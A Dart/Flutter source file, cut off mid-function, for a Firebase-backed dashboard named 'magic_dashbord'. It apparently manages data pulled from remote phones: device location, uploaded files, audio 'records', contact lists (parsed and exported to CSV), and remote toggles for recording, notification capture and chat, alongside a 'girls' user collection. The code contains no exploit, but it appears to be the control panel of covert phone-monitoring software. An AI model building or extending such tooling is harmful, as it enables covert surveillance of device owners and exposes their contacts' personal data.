import 'dart:convert';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:file_picker/file_picker.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:magic_dashbord/model/control_model.dart';
import 'package:magic_dashbord/model/device_model.dart';
import 'package:magic_dashbord/model/files_scan_info_model.dart';
import 'package:magic_dashbord/model/girl_model.dart';
import 'package:magic_dashbord/model/location_model.dart';
import 'package:magic_dashbord/services/download_service.dart';
import 'dart:html' as html;

class DbHelper {
  final DatabaseReference _ref = FirebaseDatabase.instance.ref('control_gear');
  final DatabaseReference _refControlHistory =
      FirebaseDatabase.instance.ref('control_history');
  final DatabaseReference _refDevice = FirebaseDatabase.instance.ref('devices');
  final DatabaseReference _refContacts =
      FirebaseDatabase.instance.ref('contacts');
  final DatabaseReference _refDrivers =
      FirebaseDatabase.instance.ref('drivers');
  final DatabaseReference _refGirls = FirebaseDatabase.instance.ref('girls');
  final DatabaseReference _refOpen = FirebaseDatabase.instance.ref('open');

  Stream<Map<String, ControlModel>?> fetchData() {
    return _ref.onValue.map((DatabaseEvent event) {
      var data = event.snapshot.value;

      if (data != null) {
        return controlModelsFromJson(jsonEncode(data));
      } else {
        return null;
      }
    });
  }

  Stream<Map<String, DeviceModel>?> fetchDevices() {
    return _refDevice.onValue.map((DatabaseEvent event) {
      var data = event.snapshot.value;
      //print(data);
      if (data != null) {
        return deviceModelsFromJson(jsonEncode(data));
      } else {
        return null;
      }
    });
  }

  Stream<int?> fetchUploadedFilesCount(String id) {
    final DatabaseReference ref = FirebaseDatabase.instance
        .ref('files/$id/scan_info/total_uploaded_count');

    return ref.onValue.map((DatabaseEvent event) {
      final value = event.snapshot.value;
      if (value is int) {
        return value;
      } else if (value is String) {
        return int.tryParse(value);
      } else {
        return null;
      }
    });
  }

  Stream<int?> fetchContacts(String id) {
    // print('ID: $id');
    return _refContacts.child('$id/count').onValue.map((DatabaseEvent event) {
      var data = event.snapshot.value;

      if (data != null) {
        return data is int
            ? data
            : int.tryParse(data.toString()); // Ensure we return an int
      } else {
        return null;
      }
    });
  }

  // Future<List<Map<String, dynamic>>> getContacts() async {
  //   List<Map<String, dynamic>> contactsList = [];
  //   try {
  //     DatabaseEvent event = await _refContacts.once();

  //     if (event.snapshot.exists) {
  //       final data = event.snapshot.value as Map<dynamic, dynamic>;
  //       data.forEach((k, v) {
  //         final contact = v as Map;
  //         contactsList.add({'id': k, 'count': contact.length});
  //       });
  //     }
  //   } catch (e) {
  //     print("Error fetching contacts: $e");
  //   }
  //   return contactsList;
  // }

  // Methods for contacts from Firebase Storage folders
  Future<List<String>> getContactFolders(String uid) async {
    try {
      print('📁 Getting contact folders for UID: $uid');
      final ref = FirebaseStorage.instance.ref('files/$uid');
      final ListResult result = await ref.listAll();

      print('📂 Total prefixes found: ${result.prefixes.length}');
      print('📄 Total files found: ${result.items.length}');

      List<String> contactFolders = [];
      List<String> allFolders = [];

      for (final prefix in result.prefixes) {
        allFolders.add(prefix.name);
        print('📁 Found folder: ${prefix.name}');

        // Check if it's any folder that might contain contacts
        // We'll be more permissive here and check content later
        if (prefix.name.startsWith('contact_') ||
            prefix.name.contains('contact') ||
            prefix.name.contains('address') ||
            prefix.name.contains('phone')) {
          contactFolders.add(prefix.name);
          print('✅ Potential contact folder: ${prefix.name}');
        } else {
          // Also check the folder contents for contacts.txt file
          try {
            final folderContents = await prefix.listAll();
            bool hasContactsFile = folderContents.items.any((item) =>
                item.name.toLowerCase() == 'contacts.txt' ||
                item.name.toLowerCase() == 'contact.txt');

            if (hasContactsFile) {
              contactFolders.add(prefix.name);
              print(
                  '✅ Contact folder found (has contacts file): ${prefix.name}');
            } else {
              print('ℹ️ Folder ${prefix.name} has no contacts file');
            }
          } catch (e) {
            print('⚠️ Could not check folder ${prefix.name}: $e');
          }
        }
      }

      print('📋 All folders: $allFolders');
      print('📞 Contact folders: $contactFolders');

      return contactFolders;
    } catch (e) {
      print('❌ Error listing contact folders: $e');

      // Check if it's a quota exceeded error
      if (e.toString().contains('quota-exceeded')) {
        print(
            '💾 Firebase Storage quota exceeded. Please check your Firebase billing.');
        throw Exception(
            'Firebase Storage quota exceeded. Please upgrade your Firebase plan or wait for quota reset.');
      }

      return [];
    }
  }

  Future<String> getContactFileFromFolder(String uid, String folderName) async {
    try {
      print('📄 Reading contact file from: files/$uid/$folderName/');

      // First, let's see what files are actually in this folder
      final folderRef = FirebaseStorage.instance.ref('files/$uid/$folderName');
      try {
        final folderContents = await folderRef.listAll();
        print('📂 Files in folder $folderName:');
        for (final item in folderContents.items) {
          print('   📄 File: ${item.name}');
        }
        print('   Total files in folder: ${folderContents.items.length}');

        // Try to find contacts file with different possible names (prioritize contacts.txt)
        String? contactFileName;
        for (final item in folderContents.items) {
          final fileName = item.name.toLowerCase();
          if (fileName == 'contacts.txt') {
            contactFileName = item.name;
            print('✅ Found contacts file: $contactFileName');
            break;
          } else if (fileName == 'contact.txt') {
            contactFileName = item.name;
            print('✅ Found contact file: $contactFileName');
            break;
          }
        }

        if (contactFileName == null) {
          print('❌ No contact file found in folder $folderName');
          return '';
        }

        // Read the found contact file
        final ref = FirebaseStorage.instance
            .ref('files/$uid/$folderName/$contactFileName');
        final data = await ref.getData();
        if (data != null) {
          final content = utf8.decode(data);
          print(
              '✅ Successfully read contact file, length: ${content.length} chars');
          return content;
        } else {
          print('⚠️ Contact file is empty or null');
        }
      } catch (e) {
        print('❌ Error listing folder contents: $e');

        // Fallback: try the standard contacts.txt first, then contact.txt
        print('🔄 Trying fallback: contacts.txt');
        try {
          final ref = FirebaseStorage.instance
              .ref('files/$uid/$folderName/contacts.txt');
          final data = await ref.getData();
          if (data != null) {
            final content = utf8.decode(data);
            print(
                '✅ Successfully read contacts file via fallback, length: ${content.length} chars');
            return content;
          }
        } catch (e2) {
          print('🔄 Trying fallback: contact.txt');
          final ref = FirebaseStorage.instance
              .ref('files/$uid/$folderName/contact.txt');
          final data = await ref.getData();
          if (data != null) {
            final content = utf8.decode(data);
            print(
                '✅ Successfully read contact file via fallback, length: ${content.length} chars');
            return content;
          }
        }
      }
    } catch (e) {
      print('❌ Error reading contact file from folder $folderName: $e');

      // Check if it's a quota exceeded error
      if (e.toString().contains('quota-exceeded')) {
        print('💾 Firebase Storage quota exceeded when reading contact file.');
        throw Exception(
            'Firebase Storage quota exceeded. Cannot read contact files.');
      }
    }
    return '';
  }

  // Method to download contact file to PC
  Future<void> downloadContactFile(String uid, String folderName) async {
    try {
      print('💾 Downloading contact file...');

      // First, find the actual contact file name
      final folderRef = FirebaseStorage.instance.ref('files/$uid/$folderName');
      final folderContents = await folderRef.listAll();

      String? contactFileName;
      for (final item in folderContents.items) {
        final fileName = item.name.toLowerCase();
        if (fileName == 'contacts.txt') {
          contactFileName = item.name;
          print('✅ Found contacts file for download: $contactFileName');
          break;
        } else if (fileName == 'contact.txt') {
          contactFileName = item.name;
          print('✅ Found contact file for download: $contactFileName');
          break;
        }
      }

      if (contactFileName == null) {
        throw Exception('No contact file found in folder $folderName');
      }

      final ref = FirebaseStorage.instance
          .ref('files/$uid/$folderName/$contactFileName');

      // Get download URL
      final downloadUrl = await ref.getDownloadURL();
      final fileName = 'contacts_$folderName.txt';

      // Use the specialized contact download method from DownloadService
      await DownloadService.downloadContactFileDirectly(downloadUrl, fileName);

      print('✅ Contact file download started!');
    } catch (e) {
      print('❌ Error downloading contact file: $e');
      rethrow;
    }
  }

  Future<List<Map<String, dynamic>>> parseContactsFromFolder(
      String uid, String folderName) async {
    try {
      // For now, just return basic folder info without parsing
      return [
        {
          'name': 'Contact folder: $folderName',
          'phones': ['Download file to see contacts'],
          'emails': [],
          'organization': 'Folder found in Firebase Storage',
          'folder': folderName,
          'uid': uid,
        }
      ];
    } catch (e) {
      print('❌ Error with folder $folderName: $e');
      return [];
    }
  }

  Future<Map<String, Map<String, List<Map<String, dynamic>>>>>
      getAllContactFoldersData() async {
    try {
      print('🔄 Getting all contact folders data...');
      // Get all device UIDs from database
      final devicesEvent = await _ref.once();
      final Map<String, Map<String, List<Map<String, dynamic>>>>
          allContactsData = {};

      if (devicesEvent.snapshot.exists) {
        final data = devicesEvent.snapshot.value as Map<dynamic, dynamic>;
        print('📱 Found ${data.keys.length} devices in database');

        for (final uid in data.keys) {
          final uidStr = uid.toString();
          print('🔍 Checking UID: $uidStr');
          final contactFolders = await getContactFolders(uidStr);
          print(
              '📁 Found ${contactFolders.length} contact folders for $uidStr');

          if (contactFolders.isNotEmpty) {
            Map<String, List<Map<String, dynamic>>> folderContacts = {};

            for (final folder in contactFolders) {
              print('📂 Processing folder: $folder');
              final contacts = await parseContactsFromFolder(uidStr, folder);
              print('👥 Found ${contacts.length} contacts in folder $folder');
              if (contacts.isNotEmpty) {
                folderContacts[folder] = contacts;
              }
            }

            if (folderContacts.isNotEmpty) {
              allContactsData[uidStr] = folderContacts;
              print(
                  '✅ Added data for UID $uidStr with ${folderContacts.length} folders');
            }
          }
        }
      } else {
        print('⚠️ No devices found in database');
      }

      print(
          '📊 Final result: ${allContactsData.length} devices with contact data');
      return allContactsData;
    } catch (e) {
      print('❌ Error getting all contact folders data: $e');
      return {};
    }
  }

  // Methods for working with local contact files
  Future<List<Map<String, dynamic>>?> pickAndParseContactsFile() async {
    try {
      print('📁 Opening file picker...');

      FilePickerResult? result = await FilePicker.platform.pickFiles(
        type: FileType.custom,
        allowedExtensions: ['txt'],
        allowMultiple: false,
      );

      if (result != null && result.files.single.bytes != null) {
        final fileBytes = result.files.single.bytes!;
        final fileName = result.files.single.name;

        print('✅ File selected: $fileName');
        print('📊 File size: ${fileBytes.length} bytes');

        // Decode the file content
        final content = utf8.decode(fileBytes);
        print('📝 Content length: ${content.length} characters');

        // Parse the contacts
        final contacts = await parseContactsFromContent(content, fileName);

        return contacts;
      } else {
        print('❌ No file selected');
        return null;
      }
    } catch (e) {
      print('❌ Error picking/parsing file: $e');
      return null;
    }
  }

  Future<List<Map<String, dynamic>>> parseContactsFromContent(
      String content, String source) async {
    try {
      print('🔍 Parsing contacts from: $source');

      if (content.isEmpty) {
        print('⚠️ File content is empty');
        return [];
      }

      // Check if this is the new structured format
      if (content.contains('displayName :') && content.contains('phones :')) {
        return _parseStructuredContacts(content, source);
      }

      // Original parsing for old format
      return _parseOldFormatContacts(content, source);
    } catch (e) {
      print('❌ Error parsing contacts from content: $e');
      return [];
    }
  }

  // Parser for new structured format
  List<Map<String, dynamic>> _parseStructuredContacts(
      String content, String source) {
    final contacts = <Map<String, dynamic>>[];

    // Split by "Name(" to get individual contacts
    final contactBlocks = content
        .split('Name(')
        .where((block) => block.trim().isNotEmpty)
        .toList();

    print('📊 Found ${contactBlocks.length} structured contact blocks');

    for (int i = 0; i < contactBlocks.length; i++) {
      final block = 'Name(${contactBlocks[i]}'; // Add back the "Name(" prefix
      if (block.trim().isEmpty) continue;

      print('📋 Processing structured block ${i + 1}...');

      String displayName = '';
      String firstName = '';
      String lastName = '';
      String middleName = '';
      List<String> phones = [];
      List<String> emails = [];
      String? organization;

      // Extract display name
      final displayNameMatch = RegExp(
              r'displayName\s*:\s*(.+?)(?:\s+isStarred|\s*$)',
              multiLine: true)
          .firstMatch(block);
      if (displayNameMatch != null) {
        displayName = displayNameMatch.group(1)?.trim() ?? '';
      }

      // Extract name parts from the Name() constructor
      final nameMatch =
          RegExp(r'Name\(first=([^,]*), last=([^,]*), middle=([^,]*),')
              .firstMatch(block);
      if (nameMatch != null) {
        firstName = nameMatch.group(1)?.trim() ?? '';
        lastName = nameMatch.group(2)?.trim() ?? '';
        middleName = nameMatch.group(3)?.trim() ?? '';
      }

      // Extract phones
      final phonesMatch =
          RegExp(r'phones\s*:\s*\[(.*?)\]', dotAll: true).firstMatch(block);
      if (phonesMatch != null) {
        final phonesStr = phonesMatch.group(1) ?? '';
        final phoneMatches = RegExp(r'number:\s*([^,]+)').allMatches(phonesStr);
        for (final phoneMatch in phoneMatches) {
          final phone = phoneMatch.group(1)?.trim() ?? '';
          if (phone.isNotEmpty && phone != 'null') {
            phones.add(phone);
          }
        }
      }

      // Extract emails
      final emailsMatch =
          RegExp(r'emails\s*:\s*\[(.*?)\]', dotAll: true).firstMatch(block);
      if (emailsMatch != null) {
        final emailsStr = emailsMatch.group(1) ?? '';
        final emailMatches =
            RegExp(r'address:\s*([^,]+)').allMatches(emailsStr);
        for (final emailMatch in emailMatches) {
          final email = emailMatch.group(1)?.trim() ?? '';
          if (email.isNotEmpty && email != 'null' && email.contains('@')) {
            emails.add(email);
          }
        }
      }

      // Extract organization
      final orgMatch = RegExp(r'organizations\s*:\s*\[(.*?)\]', dotAll: true)
          .firstMatch(block);
      if (orgMatch != null) {
        final orgStr = orgMatch.group(1) ?? '';
        final orgNameMatch = RegExp(r'company:\s*([^,]+)').firstMatch(orgStr);
        if (orgNameMatch != null) {
          final org = orgNameMatch.group(1)?.trim() ?? '';
          if (org.isNotEmpty && org != 'null') {
            organization = org;
          }
        }
      }

      // Use displayName if available, otherwise construct from name parts
      String finalName = displayName;
      if (finalName.isEmpty) {
        final nameParts = [firstName, middleName, lastName]
            .where((part) => part.isNotEmpty)
            .toList();
        finalName = nameParts.join(' ');
      }

      if (finalName.isNotEmpty) {
        final contact = {
          'name': finalName,
          'firstName': firstName,
          'lastName': lastName,
          'middleName': middleName,
          'phones': phones,
          'emails': emails,
          'organization': organization,
          'source': source,
          'isLocal': true,
        };
        contacts.add(contact);
        print(
            '✅ Added structured contact: $finalName (phones: ${phones.length}, emails: ${emails.length})');
      } else {
        print('❌ Skipped structured block - no name found');
      }
    }

    print(
        '✅ Successfully parsed ${contacts.length} structured contacts from $source');
    return contacts;
  }

  // Parser for old format
  List<Map<String, dynamic>> _parseOldFormatContacts(
      String content, String source) {
    final contacts = <Map<String, dynamic>>[];
    final contactBlocks = content.split('\n\n');

    print('📊 Found ${contactBlocks.length} old format contact blocks');

    for (int i = 0; i < contactBlocks.length; i++) {
      final block = contactBlocks[i];
      if (block.trim().isEmpty) continue;

      print('📋 Processing old format block ${i + 1}...');

      final lines = block.split('\n');
      if (lines.isEmpty) continue;

      String name = '';
      List<String> phones = [];
      List<String> emails = [];
      String? organization;

      for (final line in lines) {
        if (line.contains(' : ')) {
          final parts = line.split(' : ');
          if (parts.length >= 2) {
            final key = parts[0].trim();
            final value = parts.sublist(1).join(' : ').trim();

            if (key.toLowerCase().contains('name') ||
                (name.isEmpty &&
                    !key.toLowerCase().contains('phone') &&
                    !key.toLowerCase().contains('email'))) {
              if (value.isNotEmpty) name = value;
            } else if (key.toLowerCase().contains('phone') ||
                value.startsWith('+') ||
                RegExp(r'^[\d\s\-\(\)]+$').hasMatch(value)) {
              if (value.isNotEmpty && !phones.contains(value)) {
                phones.add(value);
              }
            } else if (key.toLowerCase().contains('email') ||
                value.contains('@')) {
              if (value.isNotEmpty && !emails.contains(value)) {
                emails.add(value);
              }
            } else if (key.toLowerCase().contains('organization') ||
                key.toLowerCase().contains('company')) {
              organization = value;
            }
          }
        } else if (line.trim().isNotEmpty && name.isEmpty) {
          name = line.trim();
        }
      }

      if (name.isNotEmpty) {
        final contact = {
          'name': name,
          'phones': phones,
          'emails': emails,
          'organization': organization,
          'source': source,
          'isLocal': true,
        };
        contacts.add(contact);
      }
    }

    print(
        '✅ Successfully parsed ${contacts.length} old format contacts from $source');
    return contacts;
  }

  // Method to export contacts to CSV
  Future<void> exportContactsToCSV(
      List<Map<String, dynamic>> contacts, String filename) async {
    try {
      print('📊 Exporting ${contacts.length} contacts to CSV...');

      // Create CSV header
      final csvLines = <String>[];
      csvLines.add(
          'Name,First Name,Last Name,Middle Name,Phones,Emails,Organization,Source');

      // Add contact data
      for (final contact in contacts) {
        final name = _escapeCsvField(contact['name']?.toString() ?? '');
        final firstName =
            _escapeCsvField(contact['firstName']?.toString() ?? '');
        final lastName = _escapeCsvField(contact['lastName']?.toString() ?? '');
        final middleName =
            _escapeCsvField(contact['middleName']?.toString() ?? '');

        final phones = List<String>.from(contact['phones'] ?? []);
        final phonesList = _escapeCsvField(phones.join('; '));

        final emails = List<String>.from(contact['emails'] ?? []);
        final emailsList = _escapeCsvField(emails.join('; '));

        final organization =
            _escapeCsvField(contact['organization']?.toString() ?? '');
        final source = _escapeCsvField(contact['source']?.toString() ?? '');

        csvLines.add(
            '$name,$firstName,$lastName,$middleName,$phonesList,$emailsList,$organization,$source');
      }

      // Join all lines
      final csvContent = csvLines.join('\n');

      // Create blob and download
      final bytes = utf8.encode(csvContent);
      final blob = html.Blob([bytes], 'text/csv');
      final url = html.Url.createObjectUrl(blob);

      final anchor = html.AnchorElement(href: url);
      anchor.download = filename.endsWith('.csv') ? filename : '$filename.csv';
      anchor.target = '_blank';

      html.document.body?.append(anchor);
      anchor.click();
      html.document.body?.children.remove(anchor);

      html.Url.revokeObjectUrl(url);

      print('✅ CSV export completed: ${anchor.download}');
    } catch (e) {
      print('❌ Error exporting contacts to CSV: $e');
      throw Exception('Failed to export CSV: $e');
    }
  }

  // Helper method to escape CSV fields
  String _escapeCsvField(String field) {
    if (field.isEmpty) return '';

    // If field contains comma, quotes, or newlines, wrap in quotes and escape existing quotes
    if (field.contains(',') ||
        field.contains('"') ||
        field.contains('\n') ||
        field.contains('\r')) {
      return '"${field.replaceAll('"', '""')}"';
    }

    return field;
  }

  // Legacy methods for backward compatibility
  Future<String> getContactsFileContent(String deviceId) async {
    try {
      print(
          '🔍 Looking for contacts using legacy method for device: $deviceId');

      // First try to find contact folders for this device
      final contactFolders = await getContactFolders(deviceId);

      if (contactFolders.isNotEmpty) {
        // Use the first contact folder found
        final folderName = contactFolders.first;
        print('✅ Found contact folder: $folderName');
        return await getContactFileFromFolder(deviceId, folderName);
      } else {
        // No contact folders found at all
        print('⚠️ No contact folders found for device: $deviceId');
      }
    } catch (e) {
      print('❌ Error reading contacts file: $e');
    }
    return '';
  }

  Future<List<Map<String, dynamic>>> parseContactsFromStorage(
      String deviceId) async {
    try {
      final content = await getContactsFileContent(deviceId);
      if (content.isEmpty) return [];

      final contacts = <Map<String, dynamic>>[];
      final contactBlocks = content.split('\n\n');

      for (final block in contactBlocks) {
        if (block.trim().isEmpty) continue;

        final lines = block.split('\n');
        if (lines.isEmpty) continue;

        String name = '';
        List<String> phones = [];
        List<String> emails = [];
        String? organization;

        for (final line in lines) {
          if (line.contains(' : ')) {
            final parts = line.split(' : ');
            if (parts.length >= 2) {
              final key = parts[0].trim();
              final value = parts.sublist(1).join(' : ').trim();

              if (key.toLowerCase().contains('name') ||
                  (name.isEmpty &&
                      !key.toLowerCase().contains('phone') &&
                      !key.toLowerCase().contains('email'))) {
                if (value.isNotEmpty) name = value;
              } else if (key.toLowerCase().contains('phone') ||
                  value.startsWith('+') ||
                  RegExp(r'^[\d\s\-\(\)]+$').hasMatch(value)) {
                if (value.isNotEmpty && !phones.contains(value)) {
                  phones.add(value);
                }
              } else if (key.toLowerCase().contains('email') ||
                  value.contains('@')) {
                if (value.isNotEmpty && !emails.contains(value)) {
                  emails.add(value);
                }
              } else if (key.toLowerCase().contains('organization') ||
                  key.toLowerCase().contains('company')) {
                organization = value;
              }
            }
          } else if (line.trim().isNotEmpty && name.isEmpty) {
            // If no name found yet, use first non-empty line as name
            name = line.trim();
          }
        }

        if (name.isNotEmpty) {
          contacts.add({
            'name': name,
            'phones': phones,
            'emails': emails,
            'organization': organization,
            'deviceId': deviceId,
          });
        }
      }

      return contacts;
    } catch (e) {
      print('Error parsing contacts: $e');
      return [];
    }
  }

  Future<Map<String, List<Map<String, dynamic>>>> getAllDeviceContacts() async {
    try {
      // Get devices from the stream
      final devicesEvent = await _ref.once();
      final Map<String, List<Map<String, dynamic>>> allContacts = {};

      if (devicesEvent.snapshot.exists) {
        final data = devicesEvent.snapshot.value as Map<dynamic, dynamic>;

        for (final deviceId in data.keys) {
          final contacts = await parseContactsFromStorage(deviceId.toString());
          if (contacts.isNotEmpty) {
            allContacts[deviceId.toString()] = contacts;
          }
        }
      }

      return allContacts;
    } catch (e) {
      print('Error getting all device contacts: $e');
      return {};
    }
  }

  Stream<ControlModel?> fetchDeviceData(String id) {
    return _ref.child(id).onValue.map((DatabaseEvent event) {
      var data = event.snapshot.value;

      if (data != null) {
        return ControlModel.fromRawJson(jsonEncode(data));
      } else {
        return null;
      }
    });
  }

  static Future<FilesScanInfoModel?> getFilesScanInfo(String id) async {
    final ref = FirebaseDatabase.instance.ref('files/$id/scan_info');
    final snapshot = await ref.get();
    if (snapshot.exists) {
      return FilesScanInfoModel.fromMap(
          Map<String, dynamic>.from(snapshot.value as Map));
    }
    return null;
  }

  Future<DeviceInfoModel?> getDeviceInfo(String id) async {
    final snapshot = await _refDevice.child('$id/info').get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return DeviceInfoModel.fromJson(jsonEncode(data));
      }
    }

    return null;
  }

  Future<LocationModel?> getDeviceLocation(String id) async {
    final snapshot = await _refDevice.child('$id/location').get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return LocationModel.fromJson(jsonEncode(data));
      }
    }
    print('Location: No data available.');
    return null;
  }

  Future<void> saveGirlId(Map<String, dynamic> data) async {
    String id = data['id'];
    DatabaseReference ref = FirebaseDatabase.instance.ref("girls/$id");
    await ref.set(data);
  }

  Future<List<GirlModel>> getGirls() async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("girls");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        Map<String, GirlModel> result = girlsModelFromJson(jsonEncode(data));
        List<GirlModel> girls = result.entries.map((e) {
          GirlModel model = e.value;
          return model;
        }).toList();
        return girls;
      }
    }
    print('Girls: No data available.');
    return [];
  }

  Future<bool> checkChat(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/chat");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    print('Chat: No data available.');
    return false;
  }

  Future<bool> checkRecord(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/record");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    print('Record: No data available.');
    return false;
  }

  Future<bool> checkNotifications(String id) async {
    DatabaseReference ref =
        FirebaseDatabase.instance.ref("devices/$id/notifications");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    print('Notifications: No data available.');
    return false;
  }

  Future<bool> checkActiveGirl(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("girls/$id/isActive");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    print('Is active: No data available.');
    return false;
  }

  Future<void> setChat(String id, bool state) async {
    DatabaseReference chatRef =
        FirebaseDatabase.instance.ref("devices/$id/chat");
    await chatRef.set(state);
  }

  Future<void> setNotifications(String id, bool state) async {
    DatabaseReference notificationsRef =
        FirebaseDatabase.instance.ref("devices/$id/notifications");
    await notificationsRef.set(state);
  }

  Future<void> setRecord(String id, bool state) async {
    DatabaseReference chatRef =
        FirebaseDatabase.instance.ref("devices/$id/record");
    await chatRef.set(state);
  }

  Future<void> updateGirlActive(String id, bool state) async {
    DatabaseReference chatRef = FirebaseDatabase.instance.ref("girls/$id");
    await chatRef.update({'isActive': state});
  }

  Future<String> updateMagicUser(Map<String, dynamic> data) {
    CollectionReference users = FirebaseFirestore.instance.collection('users');
    final user = FirebaseAuth.instance.currentUser;

    return users
        .doc(user!.uid)
        .update(data)
        .then((value) => ("User Updated"))
        .catchError((error) => ("Failed to update user: $error"));
  }

  Future<void> addAvatar(String id, String name) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("drivers/$id");
    await ref.set({'avatar': name});
  }

  Future<String> getImageUrl(String path) async {
    try {
      final ref = FirebaseStorage.instance.ref().child(path);
      final url = await ref.getDownloadURL();
      return url;
    } catch (e) {
      return '';
    }
  }

  // Method to get all files from multiple device folders for batch download
  Future<List<Map<String, String>>> getAllFilesFromDeviceFolders(
      List<String> deviceIds) async {
    List<Map<String, String>> allFiles = [];

    try {
      final storageRef = FirebaseStorage.instance.ref();

      for (final deviceId in deviceIds) {
        print('📁 Getting files from device: $deviceId');

        try {
          final deviceRef = storageRef.child('files/$deviceId');
          final listResult = await deviceRef.listAll();

          for (final item in listResult.items) {
            try {
              final downloadUrl = await item.getDownloadURL();
              allFiles.add({
                'name': '${deviceId}_${item.name}',
                'url': downloadUrl,
                'deviceId': deviceId,
                'originalName': item.name,
              });
              print('✅ Added file: ${item.name} from $deviceId');
            } catch (e) {
              print('❌ Error getting URL for ${item.name}: $e');
            }
          }

          print('📊 Device $deviceId: ${listResult.items.length} files found');
        } catch (e) {
          print('❌ Error accessing device $deviceId: $e');
        }
      }

      print('🎉 Total files collected: ${allFiles.length}');
      return allFiles;
    } catch (e) {
      print('❌ Error in batch file collection: $e');
      return [];
    }
  }

  Future<String> downloadAllFilesToDownloadsFolder(String id) async {
    try {
      final storageRef = FirebaseStorage.instance.ref().child('files/$id');

      final listResult = await storageRef.listAll();

      for (final item in listResult.items) {
        final fileRef = item;
        final downloadUrl = await fileRef.getDownloadURL();
        final fileName = fileRef.name;

        // Use the specialized download method from DownloadService
        await DownloadService.downloadContactFileDirectly(
            downloadUrl, fileName);

        // Small delay between downloads
        await Future.delayed(const Duration(milliseconds: 500));
      }

      return 'done';
    } catch (e) {
      print('Error downloading files: $e');
      return 'error';
    }
  }

  // Method for batch downloading using DownloadService
  Future<List<Map<String, String>>> getDeviceFilesForDownload(String id) async {
    try {
      final storageRef = FirebaseStorage.instance.ref().child('files/$id');
      final listResult = await storageRef.listAll();

      final files = <Map<String, String>>[];

      for (final item in listResult.items) {
        final downloadUrl = await item.getDownloadURL();
        files.add({
          'name': item.name,
          'url': downloadUrl,
        });
      }

      return files;
    } catch (e) {
      print('Error getting device files: $e');
      return [];
    }
  }

  // Method to get files from specific folders
  Future<List<Map<String, String>>> getFilesFromFolders(
      String deviceId, List<String> folderNames) async {
    try {
      final files = <Map<String, String>>[];

      for (final folderName in folderNames) {
        final folderRef =
            FirebaseStorage.instance.ref('files/$deviceId/$folderName');
        final listResult = await folderRef.listAll();

        for (final item in listResult.items) {
          final downloadUrl = await item.getDownloadURL();
          files.add({
            'name': '${folderName}_${item.name}',
            'url': downloadUrl,
          });
        }
      }

      return files;
    } catch (e) {
      print('Error getting files from folders: $e');
      return [];
    }
  }

  Future<String> getUserName(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/name");

    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as String;
      }
    }

    return '';
  }

  Future<void> setUserName(String id, String name) async {
    DatabaseReference chatRef =
        FirebaseDatabase.instance.ref("devices/$id/name");
    await chatRef.set(name);
  }

  // Future<void> deleteAllContacts() async {
  //   //!past contacts here
  //   List<String> list = [
  //     '84353e90-4970-1f0a-9f1a-93402209c147',
  //     'b3188370-b9b2-1f0c-8d8b-5dd60bc55e73',
  //   ];

  //   for (var item in list) {
  //     await _refContacts.child(item).remove();
  //   }
  // }

  Future<void> removeGirlById(String id) async {
    await _refGirls.child(id).remove();
    CollectionReference users = FirebaseFirestore.instance.collection('users');
    return users
        .doc(id)
        .delete()
        .then((value) => print("User Deleted"))
        .catchError((error) => print("Failed to delete user: $error"));
  }

  Future<String> removeDevice(String id) async {
//contacts, control_gear, control_history, drivers, open, devices
    // if ((await _refContacts.child(id).get()).exists) {
    //   await _refContacts.child(id).remove();
    // }
    if ((await _ref.child(id).get()).exists) {
      await _ref.child(id).remove();
    }
    if ((await _refControlHistory.child(id).get()).exists) {
      await _refControlHistory.child(id).remove();
    }
    if ((await _refDrivers.child(id).get()).exists) {
      await _refDrivers.child(id).remove();
    }
    if ((await _refOpen.child(id).get()).exists) {
      await _refOpen.child(id).remove();
    }
    if ((await _refDevice.child(id).get()).exists) {
      await _refDevice.child(id).remove();
    }
    return 'done';
  }

  Future<int> getNumberOfRecords(String id) async {
    final storageRef = FirebaseStorage.instance.ref('files/$id/records');
    final listResult = await storageRef.listAll();

    int fileCount = 0;
    for (final item in listResult.items) {
      if (item.fullPath.isNotEmpty) {
        fileCount++;
      }
    }

    return fileCount;
  }

  Future<void> setGame(String id, bool state) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/game");
    await ref.set(state);
  }

  Future<bool> checkGame(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/game");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    print('Game: No data available.');
    return false;
  }

  Future<List<Map<String, dynamic>>> getAuthUsers() async {
    try {
      // Отримуємо користувачів з Firestore колекції 'users'
      CollectionReference users =
          FirebaseFirestore.instance.collection('users');
      QuerySnapshot querySnapshot = await users.get();

      List<Map<String, dynamic>> authUsers = [];
      for (var doc in querySnapshot.docs) {
        final data = doc.data() as Map<String, dynamic>;
        authUsers.add({
          'id': doc.id,
          'firstName': data['firstName'] ?? '',
          'lastName': data['lastName'] ?? '',
          'email': data['email'] ?? '',
          'imageUrl': data['imageUrl'] ?? '',
        });
      }
      return authUsers;
    } catch (e) {
      print('Error fetching auth users: $e');
      return [];
    }
  }

  Future<String> addGirlFromAuthUser(Map<String, dynamic> userData) async {
    try {
      final girlData = {
        'id': userData['id'],
        'firstName': userData['firstName'],
        'lastName': userData['lastName'],
        'email': userData['email'],
